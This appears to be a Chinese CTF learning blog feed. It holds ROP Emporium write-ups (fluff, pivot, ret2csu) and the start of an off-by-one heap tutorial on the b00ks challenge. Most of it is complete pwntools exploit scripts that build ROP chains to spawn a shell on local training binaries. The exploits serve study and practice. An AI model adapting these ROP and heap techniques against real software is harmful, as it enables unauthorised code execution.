class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>感觉自己写的好麻烦，还需要异或俩次才可以，后来看了别人的wp发现，直接xor edx，edx 就不用第二次异或了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"><span class="comment">#elf=ELF("./fluff32")		#换成这样也可以</span></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span>    <span class="comment"># system_plt_addr=elf.plt['system']</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span>			 <span class="comment"># bss_addr=elf.bss()</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line">xor_edx_edx=<span class="number">0x08048671</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="fluff-64"><a href="#fluff-64" class="headerlink" title="fluff_64"></a>fluff_64</h3><p>用老方法查看gadget没找到合适的。。。 然后wp上说要加上 –depth ，加上以后就找到了 <del>_</del>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">system_plt_addr&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">bss_addr&#x3D;elf.bss()</span><br><span class="line">xor_r11_r11_addr&#x3D;0x0000000000400822</span><br><span class="line">pop_r12_addr&#x3D;0x0000000000400832</span><br><span class="line">xor_r11_r12_addr&#x3D;0x000000000040082f</span><br><span class="line">xchg_r11_r10_addr&#x3D;0x0000000000400840</span><br><span class="line">mov_r10_r11_addr&#x3D;0x000000000040084e</span><br><span class="line">pop_rdi_addr&#x3D;0x00000000004008c3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#addr-&gt;r10</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;p64(bss_addr)</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(xchg_r11_r10_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">#data-&gt;r11</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(mov_r10_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pivot-32"><a href="#pivot-32" class="headerlink" title="pivot_32"></a>pivot_32</h3><p>感觉难度突然增加，有点绝望，果然pwn还是很难，这题呢主要考察俩个点，一个是栈的迁移，一个是泄露目标函数的地址，这里我用了俩种方法写，大同小异而已</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">sh=process(<span class="string">"./pivot32"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pivot32"</span>)</span><br><span class="line">libc_elf=ELF(<span class="string">"./libpivot32.so"</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr=elf.plt[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_got_addr=elf.got[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_sym=libc_elf.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win_sym=libc_elf.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line">offset=int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x080486a8</span></span><br><span class="line">mov_eax_eax_addr=<span class="number">0x080488c4</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080488c0</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x08048571</span></span><br><span class="line">add_eax_ebx_addr=<span class="number">0x080488c7</span></span><br><span class="line">call_eax=<span class="number">0x080486a3</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">fake_ebp=int(sh.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload1=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(foothold_function_plt_addr)</span><br><span class="line">payload1+=p32(pop_eax_addr)</span><br><span class="line">payload1+=p32(foothold_function_got_addr)</span><br><span class="line">payload1+=p32(mov_eax_eax_addr)</span><br><span class="line">payload1+=p32(pop_ebx_addr)</span><br><span class="line">payload1+=p32(offset)</span><br><span class="line">payload1+=p32(add_eax_ebx_addr)</span><br><span class="line">payload1+=p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload2+=p32(fake_ebp)</span><br><span class="line">payload2+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>第二种方法就是将esp部分也用gadget表示，不用再向第一种一样伪造一个堆栈了，也就是说不用管ebp的值了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">libc_elf&#x3D;ELF(&quot;.&#x2F;libpivot32.so&quot;)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_sym&#x3D;libc_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;libc_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">mov_eax_eax_addr&#x3D;0x080488c4</span><br><span class="line">pop_eax_addr&#x3D;0x080488c0</span><br><span class="line">pop_ebx_addr&#x3D;0x08048571</span><br><span class="line">add_eax_ebx_addr&#x3D;0x080488c7</span><br><span class="line">call_eax&#x3D;0x080486a3</span><br><span class="line">pop_eax&#x3D;0x080488c0</span><br><span class="line">xchg_eax_esp&#x3D;0x080488c2</span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">fake_ebp&#x3D;int(sh.recv(10),16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1&#x3D;p32(foothold_function_plt_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(foothold_function_got_addr)</span><br><span class="line">payload1+&#x3D;p32(mov_eax_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(offset)</span><br><span class="line">payload1+&#x3D;p32(add_eax_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&quot;a&quot;*40+&quot;a&quot;*4</span><br><span class="line">payload2+&#x3D;p32(pop_eax)</span><br><span class="line">payload2+&#x3D;p32(fake_ebp)</span><br><span class="line">payload2+&#x3D;p32(xchg_eax_esp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pivot-64"><a href="#pivot-64" class="headerlink" title="pivot_64"></a>pivot_64</h3><p>这个题和32位的第二种方法一样，本来想用第一种方法的，但是在搜索leave；ret 的gadget时发现都存在<code>0a</code>截断，需要将<code>0a</code>变为其他字符，最后再用寄存器变成<code>0a</code>,程序第二次输入被限制了，我找了几个gadget发现输入都不够。还是自己太菜了 呜呜呜<del>~</del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">lib_elf&#x3D;ELF(&quot;.&#x2F;libpivot.so&quot;)</span><br><span class="line"></span><br><span class="line">fun_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">fun_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">fun_sym&#x3D;lib_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;lib_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-fun_sym)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">heap_addr&#x3D;int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">mov_rax_rax&#x3D;0x0000000000400b05</span><br><span class="line">pop_rax&#x3D;0x0000000000400b00</span><br><span class="line">xchg_rax_rsp&#x3D;0x0000000000400b02</span><br><span class="line">call_rax&#x3D;0x000000000040098e</span><br><span class="line">add_rax_rbp&#x3D;0x0000000000400b09</span><br><span class="line">pop_rbp&#x3D;0x0000000000400900</span><br><span class="line"></span><br><span class="line">payload1&#x3D;p64(fun_plt_addr)+p64(pop_rax)+p64(fun_got_addr)</span><br><span class="line">payload1+&#x3D;p64(mov_rax_rax)+p64(pop_rbp)+p64(offset)+p64(add_rax_rbp)</span><br><span class="line">payload1+&#x3D;p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;b&#39;*40+p64(pop_rax)+p64(heap_addr)+p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2csu-64"><a href="#ret2csu-64" class="headerlink" title="ret2csu_64"></a>ret2csu_64</h3><p>学到这里说明你已经将初级ROP学完了，这道题看似特别简单，只要找一个rdx的gadget将程序规定的参数传进去就好了，但是你会发现rdx的gadget找不到。程序在运行时，都会调用libc，<code>__libc_csu_init</code>这个函数时一个初始化函数，看一下他的反汇编发现，我们可以调用他的某些gadget来给rdx赋值。但是我们在调用的时候需要call一个函数，一开始我想要call ret2win，但是因为我们需要ret2win的指针所以没有成功。我们需要一个不改变任何寄存器的值，或者不改变rdx的值的函数，文章中说_init这个函数不会改变rdx的值，所以就用它了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">ret2win&#x3D;0x00000000004007b1</span><br><span class="line">gadget_one&#x3D;0x000000000040089a</span><br><span class="line">gadget_two&#x3D;0x0000000000400880</span><br><span class="line">init_por&#x3D;0x600e38</span><br><span class="line">rdx&#x3D;0xdeadcafebabebeef</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*8</span><br><span class="line">payload+&#x3D;p64(gadget_one)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0x01)</span><br><span class="line">payload+&#x3D;p64(init_por)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(rdx)</span><br><span class="line">payload+&#x3D;p64(gadget_two)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+&#x3D;&#39;a&#39;*56</span><br><span class="line">payload+&#x3D;p64(ret2win)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>判断异或数是多少可以绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binsh &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">badchar &#x3D; [98, 105, 99, 47, 32, 102, 110, 115]</span><br><span class="line">xornum &#x3D; 1</span><br><span class="line">while 1:</span><br><span class="line">    for x in binsh:</span><br><span class="line">        tmp &#x3D; ord(x) ^ xornum</span><br><span class="line">        if tmp in badchar:</span><br><span class="line">            xornum +&#x3D; 1</span><br><span class="line">            break</span><br><span class="line">        if x &#x3D;&#x3D; &quot;\x00&quot;:</span><br><span class="line">            print (xornum)</span><br><span class="line">            xornum +&#x3D;1</span><br><span class="line">    if xornum &#x3D;&#x3D; 10:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>ROP Emporium</category>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ROP Emporium</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>off-by-one</title>
    <url>/2020/05/07/off-by-one/</url>
    <content><![CDATA[<h2 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h2><h3 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h3><p>最近几天时间都在CTF wiki上学习堆利用，花了好长时间学习了off-by-one的利用。</p>
<a id="more"></a>

<h3 id="介绍（引用ctf-wiki）"><a href="#介绍（引用ctf-wiki）" class="headerlink" title="介绍（引用ctf wiki）"></a>介绍（引用ctf wiki）</h3><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
<h3 id="off-by-one-漏洞原理-（引用ctf-wiki）"><a href="#off-by-one-漏洞原理-（引用ctf-wiki）" class="headerlink" title="off-by-one 漏洞原理 （引用ctf wiki）"></a>off-by-one 漏洞原理 （引用ctf wiki）</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h3 id="off-by-one-利用思路-（引用ctf-wiki）"><a href="#off-by-one-利用思路-（引用ctf-wiki）" class="headerlink" title="off-by-one 利用思路 （引用ctf wiki）"></a>off-by-one 利用思路 （引用ctf wiki）</h3><ol>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li>
</ol>
<p>off-by-one（这样的漏洞在刚开始学习写代码的时候特别容易出现）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">char</span> a[<span class="number">10</span>];</span><br><span class="line">		<span class="keyword">int</span> i;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				a[i]=i;</span><br><span class="line">			&#125;</span><br><span class="line">		a[<span class="number">10</span>]=<span class="string">'\0'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>

<p>数组总长度是10，从0开始，到9结束。程序错误的使用了a[10]，造成了off-by-one。</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>这道题是wiki上关于off-by-one的利用，我按照wiki上的exp，一步一步慢慢调试，终于弄会了，wiki上有俩种利用方法，目前我只弄会了第一种，第二种我会在后续发出来。</p>
<h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20200309133019053.png" alt="image-20200309133019053" style="zoom:67%;" />

<h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_9F5(off_202018, <span class="number">32</span>) ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_9F5</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+14h] [bp-Ch]@3</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [sp+18h] [bp-8h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = a1;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i ) <span class="comment">//最多可以将名字长度写成32字符</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)buf == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      buf = (<span class="keyword">char</span> *)buf + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)buf = <span class="number">0</span>;  <span class="comment">//危险部分</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><h5 id="b00k结构体"><a href="#b00k结构体" class="headerlink" title="b00k结构体"></a><code>b00k</code>结构体</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct book&#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *name;</span><br><span class="line">    char *description;</span><br><span class="line">    int size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  程序运行, 创建一个结构体数组,设为<code>b00ks</code>.</p>
<h5 id="b00k位置"><a href="#b00k位置" class="headerlink" title="b00k位置"></a><code>b00k</code>位置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30gx 0x555555756040</span><br><span class="line">0x555555756040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555756050:	0x6161616161616161	0x6161616161616161 ----&gt;author name</span><br><span class="line">b00ks&lt;--0x555555756060:	0x0000555555757480(frist b00ks)	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>author name我们可以写入32个字符，程序会在最后加入‘\x00’，当我们创建book1时，frist b00ks会覆盖掉我们的‘\x00’,当我们输出author name时，我们就可以泄露出frist b00ks指针的地址了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def create(name_size,name,des_size,description):</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(name_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(name)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(des_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(description)</span><br><span class="line"> def printf () :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line"> </span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(30,&#39;bb&#39;,255,&#39;cc&#39;)</span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;a&#39;*32)</span><br><span class="line">books_one&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;books_one:&#39; +hex(books_one))</span><br></pre></td></tr></table></figure>

<h5 id="创建第一个first-b00k"><a href="#创建第一个first-b00k" class="headerlink" title="创建第一个first b00k"></a>创建第一个<code>first b00k</code></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555b07c4f160:	0x0000000000000001	0x0000555b07c4f020</span><br><span class="line">0x555b07c4f170:	0x0000555b07c4f050	0x00000000000000ff</span><br></pre></td></tr></table></figure>

<p>当我们开辟一个足够大的description，然后再一次修改author name，覆盖frist b00ks指针的最后一个字节，frist b00ks就会指向description，我们可以伪造一个b00k，让其中的name和description指向book2的name和description。这样我们就可以达到任意读写的目的。</p>
